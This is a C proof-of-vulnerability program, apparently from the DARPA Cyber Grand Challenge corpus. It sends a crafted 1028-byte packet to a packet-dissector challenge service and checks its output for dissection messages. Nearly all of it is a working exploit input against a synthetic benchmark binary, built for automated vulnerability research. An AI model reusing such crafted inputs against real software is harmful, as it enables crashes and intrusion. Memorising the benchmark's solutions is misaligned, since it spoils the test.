#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xb2\x8a\x0e\xfa"
         "\x87\x0a\x62\x0c\xb1\x77\xd0\xf8\x09\xcc\xc8\x57\xbb\x07\xdc\x63"
         "\x4d\x00\x00\x00\xba\xa3\x2a\xf9\x42\x51\xc0\x4d\x71\xf7\xd8\xf9"
         "\xb7\x7f\x4a\x8c\x98\x25\x9e\x13\x4e\xe3\x8a\xbd\xf9\xcb\x77\x97"
         "\x20\x70\x05\x00\xc2\x9b\xe2\x6f\xbf\x03\x40\x6a\xcd\xc7\x24\xe3"
         "\xd8\xc5\x63\x18\x49\x78\x01\x44\x8d\x92\xa7\xf4\xd8\xd4\xdc\x0a"
         "\x34\x59\x4b\x8e\xf2\x6f\x05\x01\x3e\x0c\x1f\x1f\x49\x61\x46\x7d"
         "\x33\x78\x27\x36\x3b\x12\xfa\x79\x75\x9e\x59\x0e\x51\xe3\x58\x3d"
         "\x39\x10\x96\xee\xd6\x7f\x2b\xe1\xe3\xdc\xdc\xe8\x19\xe8\xbc\x02"
         "\x40\x44\xa0\xe8\x7e\xf5\xa6\xb1\x7c\x97\x9b\x31\xf1\x1c\x2f\x7a"
         "\x29\x23\xc0\x34\x92\x31\x70\xcd\xee\xba\xea\xa9\x0b\x0f\xb8\x27"
         "\x12\xfd\x83\xdc\x40\x74\x0e\x9f\x8a\xba\xeb\x9f\x9b\x84\xd4\x1d"
         "\x0e\x7a\x5f\xcd\xe2\x21\x6d\x31\x11\x3d\x7a\x07\x4a\xf7\x12\xbe"
         "\x7b\x72\x01\xd3\x8e\x96\xa3\x82\x7c\xfc\xfd\x7b\xf2\x84\xce\x48"
         "\x74\x0c\x3d\x16\xaa\x50\xa6\x53\xa1\xb2\xdd\x3b\x44\x9a\xf1\xac"
         "\x1e\x6a\x8a\xea\xea\x02\x97\x6d\x25\xc8\xe8\x54\x7a\xa6\xbc\x24"
         "\xa8\x42\x0a\x79\x92\x16\xf0\x54\x7f\xb4\xb5\x74\x97\x76\x66\xdd"
         "\x07\xbb\x2a\x29\x2f\xc7\x65\xa7\x16\x28\x4e\xbb\x04\x21\x7c\x59"
         "\xc6\x88\x93\x34\x0a\x70\x98\xd4\x97\xb0\x47\x18\x47\xe3\x98\x37"
         "\x54\xca\xa4\x5c\xbc\x49\x05\x1c\x18\x52\xf0\x7a\xce\x05\xf1\x0e"
         "\x04\x1b\xe4\xf0\x75\xaa\xc2\x51\x92\x54\x80\x9f\x14\x39\x32\xce"
         "\xec\xfb\x5f\x0c\x04\x9a\xb9\x9c\x72\x57\xc5\x8c\xe4\xa4\xae\x70"
         "\x0b\xa1\x62\x26\x49\xd2\xfb\xe1\x97\xa7\x88\xc2\x15\x7c\x48\xd8"
         "\x56\x45\x1f\x98\x69\xa6\x7b\xdf\x63\x71\xdb\x45\x56\x20\x19\x49"
         "\x73\x5a\xbc\xbb\xed\xc8\xfb\xcf\x47\x05\x05\xe3\xc6\xae\x82\x60"
         "\xfd\xec\xe0\x37\xc2\x4f\x6f\x76\x27\x3e\xfb\x41\x51\x31\x49\x6c"
         "\x77\x6e\x6f\x46\x94\xad\xc2\x21\x80\x32\xc2\x82\xb4\x3f\x84\x79"
         "\x61\x05\x24\x94\xff\x80\x10\xfe\xc4\x81\xe8\xdf\xb8\x4f\xe6\x7b"
         "\x60\x5d\xfb\x3b\xba\xa8\x2a\xe6\x87\x69\x6c\x4d\x93\x29\x4f\x3e"
         "\xdc\xc9\xdc\xd8\x0c\x74\x87\x5a\xb6\x77\x64\x75\x10\x3b\xe6\x61"
         "\x52\x7e\xd1\x01\x2a\x40\x84\x77\xff\xd3\xe6\x44\x7f\x3d\x43\xdd"
         "\x52\xab\xd4\x24\x38\xd5\x9c\x9b\x00\x79\x82\xb0\xfb\xf2\x21\x4d"
         "\x98\x4b\xa5\xdc\x84\xd9\x2c\x3d\x30\x74\xcb\x55\xbb\xcf\x01\x8f"
         "\xc9\x8d\xf3\xa1\x7e\xb2\x9e\x06\x16\xda\x68\xc2\xb3\x9c\x5c\x4c"
         "\xb4\xe5\x7a\x5d\xb3\xfe\x64\x7b\x10\x67\x5c\xbf\xe8\xde\x05\xb8"
         "\xa8\x07\x46\xd6\x5e\x4e\xf9\x05\x00\x0c\xed\xa1\x27\x9f\x62\x91"
         "\xa6\x23\xde\x2a\xc6\x5f\xa0\xee\x0f\x82\x89\x8c\x1e\x0b\xb6\x20"
         "\xa5\x8b\x5d\xc5\x17\xe4\xfe\xab\xa8\x4c\xbc\x19\x34\x6c\xdd\x67"
         "\xbc\x06\x35\x3d\x32\x23\x9b\x8c\xb6\x4b\x10\x43\x03\x88\x0c\x2d"
         "\x21\xcd\x11\x59\x74\x50\xa1\x48\x0a\x7e\x9a\x74\x03\x79\x5c\x4a"
         "\xe8\x77\x92\x0f\x7a\xa3\xd5\x67\x18\xe5\xec\x4e\xf4\xfc\x94\x1e"
         "\x9b\x9a\x7f\xe1\x4b\x81\xe2\x06\x04\x9a\xff\xf8\x90\xbb\x8c\x7f"
         "\xbf\x8a\x22\x30\x47\xcc\x4e\xec\x19\xa9\x24\x52\x38\x02\x9c\xd0"
         "\x24\xc0\xc1\xbc\xf1\x23\x5a\x86\xfb\x68\x84\x64\x93\x30\xa0\x07"
         "\x0e\xa4\x4a\x56\x24\x8a\x68\x8f\x9b\x75\x3e\xf4\xf8\x20\xdf\xf6"
         "\x41\xd0\xd6\xbf\xec\x86\x4d\x78\x64\x9a\xd5\xec\x39\xa8\x90\xf3"
         "\x29\x05\x00\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===Trinorantumpyramides
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x54\x72\x69\x6e\x6f\x72\x61\x6e\x74\x75\x6d"
         "\x70\x79\x72\x61\x6d\x69\x64\x65\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
